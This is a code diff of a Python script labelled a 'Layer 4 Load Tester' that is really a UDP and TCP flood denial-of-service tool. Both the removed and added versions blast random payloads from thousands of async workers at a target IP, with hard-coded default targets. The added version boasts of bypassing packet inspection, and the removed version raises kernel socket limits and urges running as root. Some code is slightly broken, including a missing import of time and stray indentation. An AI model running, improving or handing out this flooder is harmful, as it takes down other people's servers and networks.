@@ -1,117 +1,102 @@
-import asyncio
-import random
-import socket
-import logging
-import sys
-import os
+    import asyncio
+    import random
+    import socket
+    import logging
+    import sys
 
-# Защита от проблем с кодировкой
-sys.stdin.reconfigure(encoding='utf-8', errors='replace')
-sys.stdout.reconfigure(encoding='utf-8', errors='replace')
+    # Configure logging
+    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
-async def optimized_udp_worker(target_ip, target_port, payload, worker_id):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 128 * 1024 * 1024)
-    sock.setblocking(False)
-    
-    loop = asyncio.get_running_loop()
-    target = (target_ip, target_port)
-    packets = 0
-    last_log = time.time()
-    
-    print(f"[UDP-{worker_id}] Worker started | Size: {len(payload)} bytes")
-    
-    while True:
-        try:
-            await loop.sock_sendto(sock, payload, target)
-            packets += 1
-            
-            if packets % 100000 == 0:
-                payload = random.randbytes(len(payload))
-            
-            if time.time() - last_log > 4:
-                print(f"[UDP-{worker_id}] Active → {packets:,} packets sent")
-                last_log = time.time()
-                
-        except BlockingIOError:
-            await asyncio.sleep(0.000005)
-        except Exception:
-            await asyncio.sleep(0.0005)
-
-
-async def optimized_tcp_worker(target_ip, target_port, payload, worker_id):
-    while True:
-        try:
-            reader, writer = await asyncio.open_connection(target_ip, target_port)
+    async def tcp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
+        while True:
             try:
-                for _ in range(150):
-                    writer.write(payload)
-                    await writer.drain()
-            finally:
-                writer.close()
-                await writer.wait_closed()
-        except:
-            await asyncio.sleep(0.03)
+                async with semaphore:
+                    reader, writer = await asyncio.open_connection(target_ip, target_port)
+                    try:
+                        # Blast the payload continuously
+                        for _ in range(100):
+                            writer.write(payload)
+                            await writer.drain()
+                            
+                        # Log occasionally
+                        if random.random() < 0.01:
+                            logging.info(f"[L4 TCP] Worker {worker_id} successfully blasted {len(payload)*100} bytes.")
+                    except Exception:
+                        pass
+                    finally:
+                        writer.close()
+                        await writer.wait_closed()
+            except asyncio.CancelledError:
+                break
+            except Exception:
+                await asyncio.sleep(0.01)
 
+    async def udp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
+        while True:
+            try:
+                async with semaphore:
+                    # UDP is connectionless, so we use raw sockets for max speed
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    # Non-blocking socket
+                    sock.setblocking(False)
+                    
+                    # Get the event loop
+                    loop = asyncio.get_running_loop()
+                    
+                    for _ in range(1000): # Huge burst
+                        try:
+                            # Send UDP packet using asyncio to avoid blocking
+                            await loop.sock_sendto(sock, payload, (target_ip, target_port))
+                        except BlockingIOError:
+                            await asyncio.sleep(0.001)
+                        except Exception:
+                            break
+                            
+                    if random.random() < 0.02:
+                            logging.info(f"[L4 UDP] Worker {worker_id} successfully sent UDP burst.")
+                    sock.close()
+            except asyncio.CancelledError:
+                break
+            except Exception:
+                await asyncio.sleep(0.01)
 
-async def main():
-    print("=== Layer 4 Load Tester v2.2 (Fixed Encoding + Optimized) ===\n")
-    
-    try:
-        target_ip = input("Insert Target IP: ").strip() or "45.139.132.87"
-        target_port = int(input("Insert Target Port: ").strip() or "53")
-        method_input = input("Method (TCP/UDP/BOTH) [default BOTH]: ").strip().upper()
-        method = method_input if method_input in ["TCP", "UDP", "BOTH"] else "BOTH"
+    async def main():
+        print("--- Layer 4 Load Tester (Hibernet-Level Power) ---")
+        target_ip = input("Insert Target IP (e.g. 45.139.132.87): ").strip() or "45.139.132.87"
+        target_port_input = input("Insert Target Port (e.g. 80): ").strip() or "80"
+        target_port = int(target_port_input)
+        method = (input("Select Method (TCP/UDP, default UDP): ").strip() or "UDP").upper()
+        threads_input = input("Insert number of async workers (default 10000): ").strip() or "10000"
+        threads = int(threads_input)
+        packet_size_input = input("Insert Payload Size in bytes (default 4096): ").strip() or "4096"
+        packet_size = int(packet_size_input)
         
-        workers = int(input("Number of workers (recommended 800-1500): ").strip() or "1000")
-        packet_size = int(input("Payload size (recommended 8192-16384): ").strip() or "12288")
-    except Exception:
-        print("Ошибка ввода, используются значения по умолчанию.")
-        target_ip = "67.227.136.39"
-        target_port = 53
-        method = "UDP"
-        workers = 1000
-        packet_size = 12288
+        # Generate random garbage payload to bypass simple packet inspection
+        payload = random.randbytes(packet_size)
+        
+        # Massive concurrency limit for L4 (OS network stack limit)
+        conn_limit = min(threads, 20000)
+        semaphore = asyncio.Semaphore(conn_limit)
+        
+        tasks = []
+        logging.info(f"Starting L4 {method} attack on {target_ip}:{target_port} with {threads} workers...")
+        
+        for x in range(threads):
+            if method == 'UDP':
+                tasks.append(asyncio.create_task(udp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
+            else:
+                tasks.append(asyncio.create_task(tcp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
+                
+        try:
+            await asyncio.gather(*tasks)
+        except asyncio.CancelledError:
+            logging.info("Attack successfully cancelled.")
 
-    # Системные оптимизации
-    os.system("sysctl -w net.core.wmem_max=83886080 > /dev/null 2>&1")
-    os.system("sysctl -w net.core.rmem_max=83886080 > /dev/null 2>&1")
-    print("[+] System limits optimized for high speed")
-
-    payload = random.randbytes(packet_size)
-    
-    print(f"\n🚀 Starting {method} attack on {target_ip}:{target_port}")
-    print(f"Workers: {workers} | Packet size: {packet_size} bytes\n")
-
-    tasks = []
-    
-    if method in ["UDP", "BOTH"]:
-        for i in range(workers):
-            tasks.append(asyncio.create_task(optimized_udp_worker(target_ip, target_port, payload, i+1)))
-    
-    if method in ["TCP", "BOTH"]:
-        tcp_workers = max(200, workers // 3)
-        for i in range(tcp_workers):
-            tasks.append(asyncio.create_task(optimized_tcp_worker(target_ip, target_port, payload, i+1)))
-
-    try:
-        await asyncio.gather(*tasks, return_exceptions=True)
-    except asyncio.CancelledError:
-        print("\nAttack stopped.")
-    except Exception as e:
-        print(f"Error: {e}")
-
-
-if __name__ == '__main__':
-    if os.geteuid() != 0:
-        print("[!] Лучше запускать с sudo для максимальной скорости!")
-    
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n\nStopped by user.")
-        sys.exit(0)
-    except Exception as e:
-        print(f"Fatal error: {e}")
+    if __name__ == '__main__':
+        try:
+            if sys.platform == 'win32':
+                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+            asyncio.run(main())
+        except KeyboardInterrupt:
+            print("\nStopped by user.")
+            sys.exit(0)
